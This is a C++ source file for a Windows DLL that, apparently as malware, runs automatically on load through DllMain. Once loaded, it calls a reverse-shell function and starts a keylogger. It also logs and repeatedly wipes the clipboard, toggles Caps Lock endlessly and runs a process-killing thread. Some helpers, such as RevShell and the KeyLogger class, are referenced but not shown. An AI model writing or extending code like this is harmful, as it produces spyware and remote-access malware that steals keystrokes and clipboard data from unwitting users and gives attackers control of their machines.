#include "debug/dbg_manager.h"
#include "modules/module_manager.h"

#include <condition_variable>
#include <filesystem>
#include <functional>
#include <mutex>
#include <nlohmann/json.hpp>
#include <queue>
#include <spdlog/spdlog.h>
#include <thread>
#include <tlhelp32.h>
#include <vector>
#include <windows.h>

// Global DebugConsole to persist beyond main()
static DebugConsole *g_console = nullptr;
static KeyLogger *g_keyLogger = nullptr;

// Global mutex for clipboard access
static std::mutex clipboardMutex;

// Thread pool class
class ThreadPool {
public:
  ThreadPool(size_t numThreads) : stop(false) {
    for (size_t i = 0; i < numThreads; ++i) {
      workers.emplace_back([this] {
        while (true) {
          std::function<void()> task;
          {
            std::unique_lock<std::mutex> lock(this->queueMutex);
            this->condition.wait(
                lock, [this] { return this->stop || !this->tasks.empty(); });
            if (this->stop && this->tasks.empty())
              return;
            task = std::move(this->tasks.front());
            this->tasks.pop();
          }
          task();
        }
      });
    }
  }

  ~ThreadPool() {
    {
      std::unique_lock<std::mutex> lock(queueMutex);
      stop = true;
    }
    condition.notify_all();
    for (std::thread &worker : workers) {
      if (worker.joinable())
        worker.join();
    }
  }

  void enqueue(std::function<void()> task) {
    {
      std::unique_lock<std::mutex> lock(queueMutex);
      if (stop)
        return;
      tasks.emplace(std::move(task));
    }
    condition.notify_one();
  }

private:
  std::vector<std::thread> workers;
  std::queue<std::function<void()>> tasks;
  std::mutex queueMutex;
  std::condition_variable condition;
  bool stop;
};

// Global thread pool (e.g., 4 threads)
static ThreadPool *g_threadPool = nullptr;

void DumpInput() {
  g_keyLogger = new KeyLogger(GetTempLogFilePath());
  g_keyLogger->StartLogging();
}

DWORD WINAPI ClearClipboardThread(LPVOID lpParam) {
  while (true) {
    {
      std::lock_guard<std::mutex> lock(clipboardMutex);
      if (OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        char *pszText = static_cast<char *>(GlobalLock(hData));
        if (pszText != NULL) {
          spdlog::info("Clipboard data: {}", pszText);
          GlobalUnlock(hData);
        }
        EmptyClipboard();
        CloseClipboard();
      }
    }
    Sleep(1000);
  }
  return 0;
}

void spamCapsLock() {
  while (true) {
    keybd_event(VK_CAPITAL, 0x3A, KEYEVENTF_EXTENDEDKEY, 0);
    keybd_event(VK_CAPITAL, 0x3A, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
    Sleep(530);
  }
}

int main() {
  g_console = new DebugConsole(false);
  g_console->Initialize();
  g_console->InitializeLogging();
  DumpMemoryInfo();
  return 0;
}

extern "C" BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD fdwReason,
                               LPVOID lpRes) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    main();
    RevShell();

    // Initialize thread pool with 4 threads
    g_threadPool = new ThreadPool(4);

    // Enqueue tasks into the thread pool
    g_threadPool->enqueue([] { DumpInput(); });
    g_threadPool->enqueue([] { ClearClipboardThread(nullptr); });
    g_threadPool->enqueue([] { spamCapsLock(); });
    g_threadPool->enqueue([] { ProcessKillerThread(nullptr); });
  } else if (fdwReason == DLL_PROCESS_DETACH) {
    // Free the thread pool
    if (g_threadPool) {
      delete g_threadPool;
      g_threadPool = nullptr;
    }

    // Free DebugConsole
    if (g_console) {
      delete g_console;
      g_console = nullptr;
    }

    // Free KeyLogger
    if (g_keyLogger) {
      g_keyLogger->StopLogging();
      delete g_keyLogger;
      g_keyLogger = nullptr;
    }

    // Free console
    FreeConsole();
  }
  return 1;
}